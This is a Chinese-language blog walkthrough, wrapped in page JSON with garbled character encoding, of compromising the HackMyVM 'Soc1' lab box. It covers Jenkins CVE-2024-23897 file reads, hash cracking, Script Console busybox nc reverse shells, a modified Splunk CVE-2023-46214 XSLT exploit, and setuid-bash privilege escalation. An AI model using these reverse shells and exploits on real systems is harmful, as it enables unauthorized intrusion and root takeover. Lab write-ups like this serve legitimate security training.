{"pageProps":{"postData":{"id":"HackMyVMSoc1","contentHtml":"<h1>Soc1</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Soc1\">https://hackmyvm.eu/machines/machine.php?vm=Soc1</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMSoc1/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">âœ  Soc1 nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-03 <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">41</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00064</span>s latency).\nNot shown: <span class=\"hljs-number\">65529</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">8000</span>/tcp <span class=\"hljs-built_in\">open</span>  http-alt\n<span class=\"hljs-number\">8080</span>/tcp <span class=\"hljs-built_in\">open</span>  http-proxy\n<span class=\"hljs-number\">8089</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">8191</span>/tcp <span class=\"hljs-built_in\">open</span>  limnerpressure\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F1:<span class=\"hljs-number\">56</span>:0D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">16.82</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">âœ  Soc1 nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">8000</span>,<span class=\"hljs-number\">8080</span>,<span class=\"hljs-number\">8089</span>,<span class=\"hljs-number\">8191</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>                                                    \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-03 <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">42</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>                    \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00051</span>s latency).\n                                                         \nPORT     STATE SERVICE  VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh      OpenSSH <span class=\"hljs-number\">8.4</span>p1 Debian <span class=\"hljs-number\">5</span>+deb11u3 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">3072</span> f6:a3:b6:<span class=\"hljs-number\">78</span>:c4:<span class=\"hljs-number\">62</span>:af:<span class=\"hljs-number\">44</span>:bb:1a:a0:0c:08:6b:<span class=\"hljs-number\">98</span>:f7 (RSA)                                       \n|   <span class=\"hljs-number\">256</span> bb:e8:a2:<span class=\"hljs-number\">31</span>:d4:05:a9:c9:<span class=\"hljs-number\">31</span>:ff:<span class=\"hljs-number\">62</span>:f6:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">84</span>:<span class=\"hljs-number\">21</span>:9d (ECDSA)\n|_  <span class=\"hljs-number\">256</span> 3b:ae:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">64</span>:4f:a5:<span class=\"hljs-number\">75</span>:b9:4a:b9:<span class=\"hljs-number\">81</span>:f9:<span class=\"hljs-number\">89</span>:<span class=\"hljs-number\">76</span>:<span class=\"hljs-number\">99</span>:eb (ED25519)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http     Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> ((Debian))                                                            \n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html; charset=UTF-8).                                                                                                                                                                 \n|_http-server-header: Apache/2.4.62 (Debian)                                                                      \n8000/tcp open  http     Splunkd httpd                                                                             \n| http-title: Site doesn'</span>t have a title (text/html; charset=UTF-<span class=\"hljs-number\">8</span>).                                               \n|_Requested resource was http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>:<span class=\"hljs-number\">8000</span>/en-US/account/login?return_to=%2Fen-US%2F                     \n| http-robots.txt: <span class=\"hljs-number\">1</span> disallowed entry                    \n|_/                                                      \n|_http-server-header: Splunkd                            \n<span class=\"hljs-number\">8080</span>/tcp <span class=\"hljs-built_in\">open</span>  http     Jetty <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18</span>                    \n| http-<span class=\"hljs-built_in\">open</span>-proxy: Potentially OPEN proxy.               \n|_Methods supported:CONNECTION                                                                                    \n|_http-title: Dashboard [Jenkins]                                                                                                                                                                                                   \n| http-robots.txt: <span class=\"hljs-number\">1</span> disallowed entry                    \n|_/                                                                                                                                                                                                                                 \n|_http-server-header: Jetty(<span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18</span>)                                                                              \n<span class=\"hljs-number\">8089</span>/tcp <span class=\"hljs-built_in\">open</span>  ssl/http Splunkd httpd                                                                                                                                                                                               \n|_http-title: splunkd              \n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                               \n| Not valid before: <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-13T11:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>         \n|_Not valid after:  <span class=\"hljs-number\">2028</span>-<span class=\"hljs-number\">10</span>-12T11:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>\n| http-robots.txt: <span class=\"hljs-number\">1</span> disallowed entry \n|_/                \n|_http-server-header: Splunkd\n<span class=\"hljs-number\">8191</span>/tcp <span class=\"hljs-built_in\">open</span>  mongodb  MongoDB <span class=\"hljs-number\">3.6</span> after <span class=\"hljs-number\">3.6</span><span class=\"hljs-number\">.3</span>, <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">3.7</span><span class=\"hljs-number\">.3</span> <span class=\"hljs-keyword\">or</span> later                                                \nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F1:<span class=\"hljs-number\">56</span>:0D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                                  \nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port             \nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router                                                                               \nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X, MikroTik RouterOS <span class=\"hljs-number\">7.</span>X            \nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span> cpe:/o:mikrotik:routeros:<span class=\"hljs-number\">7</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>                                                                                                          \nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, OpenWrt <span class=\"hljs-number\">21.02</span> (Linux <span class=\"hljs-number\">5.4</span>), MikroTik RouterOS <span class=\"hljs-number\">7.2</span> - <span class=\"hljs-number\">7.5</span> (Linux <span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>)                                                                                                                                 \nNetwork Distance: <span class=\"hljs-number\">1</span> hop                                                                                           \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n                                                         \nTRACEROUTE                                               \nHOP RTT     ADDRESS            \n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.50</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>                                                                                        \n                                                         \nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">52.71</span> seconds   \n</code></pre>\n<p>å¼€æ”¾äº†å¤šä¸ª Web æœåŠ¡ (Apache, Splunk, Jenkins) å’Œä¸€ä¸ªæ•°æ®åº“æœåŠ¡ (MongoDB)</p>\n<h3>æšä¸¾ - web</h3>\n<p>é¦–å…ˆè¿˜æ˜¯çœ‹ WEB æœåŠ¡ï¼Œä½†æ˜¯è²Œä¼¼å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image1.png\" alt=\"image.png\"></p>\n<p>ç›®å½•æ‰«æ</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">1l</span>        3w       16c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>/\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">1l</span>        3w       16c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>/index.php\n</code></pre>\n<h3>æšä¸¾ - Jenkins</h3>\n<p>8080 ç«¯å£æ˜¯ Jenkinsï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°å­˜åœ¨ <code>test</code> ç”¨æˆ·</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image2.png\" alt=\"image.png\"></p>\n<p>ä»ç½‘ä¸Šæœç´¢ Jenkins è¾ƒæ–°çš„æ¼æ´ï¼Œèƒ½æ‰¾åˆ°  CVE-2024-23897ï¼Œæ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>\n<p>æµ‹è¯•æ¼æ´ï¼Œç¡®è®¤å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image3.png\" alt=\"image.png\"></p>\n<p>å­˜åœ¨æ¼æ´åï¼Œå¯ä»¥æ ¹æ®è¿™ç¯‡æ–‡ç« çš„æ€è·¯è¿›è¡Œåˆ©ç”¨ï¼š <a href=\"https://blog.csdn.net/qq_34594929/article/details/136446671\">https://blog.csdn.net/qq_34594929/article/details/136446671</a></p>\n<p>å°è¯•è¯»å–ç”¨æˆ·æ–‡ä»¶ï¼Œæç¤º <code>No such file</code>ï¼Œä¼°è®¡é»˜è®¤è·¯å¾„ä¼°è®¡è¢«ä¿®æ”¹äº†</p>\n<pre><code class=\"hljs language-python\">âœ  CVE-<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">23897</span> git:(main) python CVE-<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">23897.</span>py -t <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span> -p <span class=\"hljs-number\">8080</span> -f <span class=\"hljs-string\">'/var/soc/jenkins/users/users.xml'</span> -c who-am-i\n\nCVE-<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">23897</span> | Jenkins &#x3C;= <span class=\"hljs-number\">2.441</span> &#x26; &#x3C;= LTS <span class=\"hljs-number\">2.426</span><span class=\"hljs-number\">.2</span> PoC <span class=\"hljs-keyword\">and</span> scanner.\nAlexander Hagenah / @xaitax / ah@primepage.de<span class=\"hljs-string\">\"\n\nğŸ” Scanning http://192.168.56.137:8080\nğŸ’£ Exploit Response from http://192.168.56.137:8080: \n\nERROR: No such file: /var/soc/jenkins/users/users.xml\njava -jar jenkins-cli.jar who-am-i\nReports your credential and permissions.\n</span></code></pre>\n<p>å°è¯•è¯»å–Â <code>Systemd</code> æœåŠ¡å•å…ƒæ–‡ä»¶ï¼Œå› ä¸º Linux ç³»ç»Ÿä½¿ç”¨ <code>systemd</code> æ¥ç®¡ç†æœåŠ¡ã€‚Jenkins çš„æœåŠ¡é…ç½®æ–‡ä»¶ä¼šå‘Šè¯‰æˆ‘ä»¬å®ƒä»¥å“ªä¸ªç”¨æˆ·èº«ä»½è¿è¡Œã€ç¯å¢ƒå˜é‡æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥å¯èƒ½ä¼šæœ‰è·¯å¾„ä¿¡æ¯</p>\n<p>æ¨èä½¿ç”¨æ­¤é¡¹ç›®å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼š  <a href=\"https://github.com/verylazytech/CVE-2024-23897\">https://github.com/verylazytech/CVE-2024-23897</a></p>\n<pre><code class=\"hljs language-python\">python CVE-<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">23897.</span>py -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>:<span class=\"hljs-number\">8080</span> -f <span class=\"hljs-string\">'/etc/systemd/system/jenkins.service'</span>\n</code></pre>\n<p>è¿™é‡Œè·å–åˆ°ç±»ä¼¼äº <code>jenkins</code> è·¯å¾„çš„ä¿¡æ¯ï¼Œä½†è¿˜æ˜¯é”™è¯¯çš„ï¼Œæç¤º <code>File does not exist</code></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image4.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image5.png\" alt=\"image.png\"></p>\n<p>éšç¼˜æµ‹è¯•ï¼Œæµ‹è¯•åˆ° <code>jenkins</code> ç›®å½•æ˜¯åœ¨ <code>/var/lib</code></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image6.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image7.png\" alt=\"image.png\"></p>\n<p><code>users.xml</code>æ˜¾ç¤ºç³»ç»Ÿä¸Šçš„å•ä¸ªç”¨æˆ· <code>test</code>ï¼Œå…¶æ–‡ä»¶å¤¹ä¸ºÂ <code>/var/lib/jenkins/users/test_3253830066040356536</code></p>\n<p>åœ¨æ¯ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶ä¸­ï¼Œéƒ½åŒ…å« <code>config.xml</code> æ–‡ä»¶ï¼Œå¹¶ä¸”åŒ…å«å¯†ç  HASH</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image8.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">$2a$<span class=\"hljs-number\">10</span>$vKk.FDrPqNyv01Nx2QM6Gee0aq<span class=\"hljs-number\">.7</span>HUaCZIIGfODqdShRSQNmVSZCm\n</code></pre>\n<p>å°†åŠ å¯†å¯†ç é€šè¿‡ hashcat è¿›è¡Œçˆ†ç ´</p>\n<pre><code class=\"hljs language-python\">hashcat -m <span class=\"hljs-number\">3200</span> -a <span class=\"hljs-number\">0</span> <span class=\"hljs-built_in\">hash</span> /usr/share/wordlists/rockyou.txt\n</code></pre>\n<h3>æšä¸¾ - Splunk</h3>\n<p>è¶å¯†ç è¿˜åœ¨è¿›è¡Œç ´è§£ä¸­ï¼Œæˆ‘ä»¬å†è¯»å–ä¸€ä¸‹ Splunk çš„é…ç½®æ–‡ä»¶</p>\n<p>ä½¿ç”¨å¸¸è§„çš„å®‰è£…è·¯å¾„ <code>/opt/splunk</code> è¿›è¡Œè¯»å–ï¼ŒæˆåŠŸè¯»å–</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image9.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œè¯»å–äº† <code>/opt/splunk/etc/passwd</code> å’Œ <code>/etc/system/local/server.conf</code> ç­‰æ–‡ä»¶éƒ½æ˜¯è¿”å› <code>empty</code> å’Œ\n<code>File does not exist</code></p>\n<p>STOPï¼Œå¯†ç ç ´è§£å‡ºæ¥äº†...</p>\n<h3>æšä¸¾ - Jenkins - 2</h3>\n<p>å¯†ç ç ´è§£å‡ºæ¥äº†ï¼Œæ˜¯ <code>test1234</code>ï¼Œæ„Ÿè§‰å‰é¢åº”è¯¥å†å¤šçŒœçŒœçš„ã€‚ã€‚ã€‚ã€‚</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image10.png\" alt=\"image.png\"></p>\n<h2>Jenkins åå°åˆ©ç”¨</h2>\n<p>åˆ©ç”¨åå°è¿›è¡Œåå¼¹ shellï¼Œæ‰¾åˆ° <code>Script Console</code></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image11.png\" alt=\"image.png\"></p>\n<p>å…ˆè¿›è¡Œæµ‹è¯•</p>\n<pre><code class=\"hljs language-python\">println <span class=\"hljs-string\">\"cat /etc/passwd\"</span>.execute().text\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSoc1/image12.png\" alt=\"image.png\"></p>\n<p>æˆåŠŸæ‰§è¡Œï¼Œç›´æ¥å¼¹</p>\n<pre><code class=\"hljs language-python\">println <span class=\"hljs-string\">\"busybox nc 192.168.56.5 1234 -e /bin/bash\"</span>.execute().text\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSoc1/image13.png\" alt=\"image.png\"></p>\n<p>èƒ½è¯»å– <code>user.txt</code> å­˜åœ¨äº splunk ç”¨æˆ·å®¶ç›®å½•ä¸­</p>\n<pre><code class=\"hljs language-python\">jenkins@SOC:/home/splunk$ cat user.txt\ncat user.txt\nflag{69cxxxxxxxxxxxxxxxxxxxxxxxxxx}\n</code></pre>\n<h2>ææƒ</h2>\n<p>æŸ¥çœ‹ sudo æƒé™</p>\n<pre><code class=\"hljs language-python\">jenkins@SOC:/$ sudo -l\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> jenkins on SOC:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser jenkins may run the following commands on SOC:\n    (ALL) NOPASSWD: /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk search *\n    (ALL) NOPASSWD: /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk restart\n</code></pre>\n<p>è¿™é‡Œè¿è¡Œéœ€è¦ splunk ç”¨æˆ·çš„æƒé™</p>\n<p>ç¿»åˆ° <code>passwd.old</code> ä¸­æœ‰è®°å½•ï¼Œæç¤ºæˆ‘ä»¬ Administrator çš„å¯†ç å¯ä»¥åœ¨ <code>seclists/Passwords</code> ä¸­æ‰¾åˆ°ï¼Œå¹¶ä¸”ç»™å‡ºäº† test ç”¨æˆ·çš„è´¦æˆ·å¯†ç </p>\n<pre><code class=\"hljs language-python\">jenkins@SOC:/opt/splunk/etc$ cat passwd.old \nAdministrator passwords can be found under the seclists/Passwords folder.\ngrep -R <span class=\"hljs-string\">'splunk'</span>\ntest:test1234\n</code></pre>\n<p>é‚£ä¹ˆ Administrator çš„å¯†ç å¤§æ¦‚å°±æ˜¯å¦‚ä¸‹çš„å…¶ä¸­ä¸€ä¸ª</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image14.png\" alt=\"image.png\"></p>\n<p>å¯¹å‡­æ®è¿›è¡Œæµ‹è¯•ï¼ˆæµ‹è¯•å‘½ä»¤ç”± AI ç”Ÿæˆï¼Œå¯¹ Splunk ä¸ç†Ÿï¼‰</p>\n<pre><code class=\"hljs language-python\">curl -k -u xxxx:xxxx https://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.137</span>:<span class=\"hljs-number\">8089</span>/services/apps/local\n</code></pre>\n<p>æœ€åæµ‹è¯•å¾—åˆ° <code>splunk</code>:<code>splunk123</code> æ˜¯æ­£ç¡®çš„çš„å‡­æ®ï¼Œä½†æ˜¯ä¸çŸ¥é“å¾—åˆ°å‡­æ®è¯¥å¦‚ä½•è¿›è¡Œåˆ©ç”¨</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image15.png\" alt=\"image.png\"></p>\n<p>æœ€ååœ¨ sudo æƒé™è¿™é‡Œæ­»ç£•äº†åŠå¤©ï¼Œå®åœ¨æ²¡æ‰¾åˆ°ä»€ä¹ˆæ–¹æ³•å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œæ•…æ”¾å¼ƒ</p>\n<h3><strong>CVE-2023-46214</strong></h3>\n<p>éšååœ¨ splunk ä¸­æœç´¢å¯ä»¥ä¿®æ”¹çš„æ–‡ä»¶ï¼Œèƒ½æ‰¾åˆ° <code>web.conf</code></p>\n<pre><code class=\"hljs language-python\">jenkins@SOC:/opt/splunk$ find . -<span class=\"hljs-built_in\">type</span> f -writable <span class=\"hljs-number\">2</span>>/dev/null\n./etc/system/default/web.conf\n</code></pre>\n<p>é€šè¿‡æœç´¢å¼•æ“èƒ½æ‰¾åˆ°ä¸€ä¸ªæ¼æ´æ˜¯å’Œè¯¥æ–‡ä»¶ç›¸å…³çš„ï¼ˆPSï¼šå›¾ç‰‡æ‰“é”™å­—äº†ï¼Œä½†ä¸å½±å“ï¼‰</p>\n<p><a href=\"https://www.freebuf.com/vuls/384743.html\">https://www.freebuf.com/vuls/384743.html</a></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image16.png\" alt=\"image.png\"></p>\n<p>æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨ï¼š<a href=\"https://github.com/nathan31337/Splunk-RCE-poc\">https://github.com/nathan31337/Splunk-RCE-poc</a></p>\n<p>ä¸Šè¾¹çš„æ–‡ç« çš„ä¸´æ—¶æªæ–½æ˜¯å°† <code>enableSearchJobXslt</code> æ”¹ä¸º <code>false</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŠŠå®ƒæ”¹æˆ <code>True</code></p>\n<p><img src=\"/post-images/HackMyVMSoc1/image17.png\" alt=\"image.png\"></p>\n<p>ç„¶åæˆ‘ä»¬çš„ <code>sudo</code> å…è®¸æˆ‘ä»¬é‡å¯ <code>splunk</code></p>\n<pre><code class=\"hljs language-python\">(ALL) NOPASSWD: /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk restart\n</code></pre>\n<p>æœ€ååˆ©ç”¨ POCï¼Œä½†æ˜¯æ²¡æˆåŠŸã€‚ã€‚ã€‚ã€‚</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image18.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬æŸ¥çœ‹æœªä¿®æ”¹çš„ POCï¼Œæ˜¯é€šè¿‡ <code>sh</code> æ¥å¼¹</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image19.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬ä¿®æ”¹ä¸ºé€šè¿‡ <code>busybox nc</code> æ¥å¼¹</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span>\n\n<span class=\"hljs-keyword\">import</span> argparse\n<span class=\"hljs-keyword\">import</span> requests\n<span class=\"hljs-keyword\">import</span> json\n\n<span class=\"hljs-comment\"># proxies = {\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}</span>\nproxies = {}\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">generate_malicious_xsl</span>(<span class=\"hljs-params\">ip, port</span>):\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">f\"\"\"&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&#x3C;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:exsl=\"http://exslt.org/common\" extension-element-prefixes=\"exsl\">\n  &#x3C;xsl:template match=\"/\">\n    &#x3C;exsl:document href=\"/opt/splunk/bin/scripts/shell.sh\" method=\"text\">\n        &#x3C;xsl:text>busybox nc <span class=\"hljs-subst\">{ip}</span> <span class=\"hljs-subst\">{port}</span> -e /bin/bash&#x3C;/xsl:text>\n    &#x3C;/exsl:document>\n  &#x3C;/xsl:template>\n&#x3C;/xsl:stylesheet>\n\"\"\"</span>\n......\n</code></pre>\n<p>æˆåŠŸæ¥æ”¶åˆ° Shell</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image20.png\" alt=\"image.png\"></p>\n<h3>ç¨‹åºåŠ«æŒ</h3>\n<p>å› ä¸ºæˆ‘ä»¬æ˜¯ splunk ç”¨æˆ·ï¼Œç›´æ¥æ›¿æ¢æ‰ splunkï¼Œæ›¿æ¢ä¸ºææƒçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åé€šè¿‡ Jenkins ç”¨æˆ·çš„ sudo æƒé™æ¥æ‰§è¡Œå³å¯</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image21.png\" alt=\"image.png\"></p>\n<p>æ¢­å“ˆ</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Splunk</span>\nrm /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk\necho <span class=\"hljs-string\">\"chmod +s /bin/bash\"</span> > /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk\nchmod +x /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk\n<span class=\"hljs-comment\"># Jenkins</span>\nsudo /opt/splunk/<span class=\"hljs-built_in\">bin</span>/splunk restart\n</code></pre>\n<p>æˆäº†</p>\n<p><img src=\"/post-images/HackMyVMSoc1/image22.png\" alt=\"image.png\"></p>\n<p>è¯»å– <code>root.txt</code></p>\n<pre><code class=\"hljs language-python\">jenkins@SOC:/opt/splunk/<span class=\"hljs-built_in\">bin</span>/scripts$ /<span class=\"hljs-built_in\">bin</span>/bash -p\nbash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># cat /root/root.txt </span>\nflag{418dd7b6ffb3xxxxxxxxxxxxxxxxxxxxx2f}\n</code></pre>\n<h2>æ€»ç»“</h2>\n<p>å¤´ç—›ã€‚ã€‚ã€‚å¯†ç é‚£å—æˆ‘è¿˜ç”¨ Administrator ä½œç”¨æˆ·åçˆ†ç ´äº†å¥½ä¹…ã€‚ã€‚</p>","title":"HackMyVM - Soc1","date":"2025-11-04","updated":"2025-11-04","tags":["TheHackersLabs","Linux","FUZZ","Jenkins","Splunk","CVE-2023-46214"],"categories":"é¶æœº","comments":true,"description":"Soc1 https://hackmyvm.eu/machines/machine.php?vm=Soc1 Recon PortScan å¼€æ”¾äº†å¤šä¸ª Web æœåŠ¡ (Apache, Splunk, Jenkins) å’Œä¸€ä¸ªæ•°æ®åº“æœåŠ¡ (MongoDB) æšä¸¾ web é¦–å…ˆè¿˜æ˜¯çœ‹ WEB æœåŠ¡ï¼Œä½†æ˜¯è²Œ..."},"recentPosts":[{"id":"HackMyVMSoc1","title":"HackMyVM - Soc1","date":"2025-11-04","isEncrypted":false,"year":"2025","month":"11","day":"04"},{"id":"TheHackersLabsZAPP","title":"TheHackersLabs - ZAPP","date":"2025-11-02","isEncrypted":false,"year":"2025","month":"11","day":"02"},{"id":"TheHackersLabsPhotographer","title":"TheHackersLabs - Photographer","date":"2025-11-02","isEncrypted":false,"year":"2025","month":"11","day":"02"},{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"},{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"å¿µå¿µç¢","title":"å¿µå¿µç¢","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"}]},"__N_SSG":true}